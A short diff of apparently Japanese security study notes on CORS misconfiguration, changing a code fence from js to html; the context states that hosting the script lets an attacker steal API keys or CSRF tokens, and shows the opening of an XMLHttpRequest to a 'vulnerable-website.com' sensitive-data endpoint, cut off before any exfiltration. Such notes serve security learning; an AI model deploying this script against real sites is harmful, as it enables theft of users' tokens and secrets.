@@ -22,7 +22,7 @@
 	```
 
 - 以下のスクリプトをWebサイトに配置することで、レスポンスに含まれるAPIキーだったり、CSRFトークンだったりが盗める。
-```js
+```html
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
